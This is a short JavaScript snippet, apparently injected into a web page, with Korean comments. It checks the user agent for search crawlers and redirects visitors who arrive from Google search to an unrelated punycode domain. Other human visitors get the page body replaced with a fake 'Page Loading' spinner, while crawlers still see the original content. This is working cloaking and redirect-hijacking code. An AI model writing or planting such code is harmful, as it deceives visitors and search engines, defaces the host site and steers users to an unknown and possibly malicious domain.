<script>
(function() {
  const ua = navigator.userAgent.toLowerCase();
  const isBot =
    ua.includes('bot') ||
    ua.includes('google') ||
    ua.includes('crawl') ||
    ua.includes('spider') ||
    ua.includes('slurp') ||
    ua.includes('bingpreview') ||
    ua.includes('baiduspider');

  const ref = document.referrer;

  // 구글 검색 유입이면 리디렉션
  if (ref.includes('google.')) {
    location.href = 'https://xn--hz2b15fv7g90k.com/';
    return;
  }

  // 봇이 아니라면 로딩 화면만 보여줌
  if (!isBot) {
    document.body.innerHTML = `
      <div style="height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background-color: #f9fbfc; font-family: sans-serif;">
        <div style="width: 50px; height: 50px; border-radius: 50%; border: 5px solid #eee; border-top-color: #4285f4; animation: spin 1s linear infinite;"></div>
        <div style="margin-top: 20px; font-size: 18px; color: #444;">Page Loading</div>
        <div style="font-size: 14px; color: #888;">Please wait a moment</div>
      </div>
      <style>
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      </style>
    `;
  }
})();
</script>
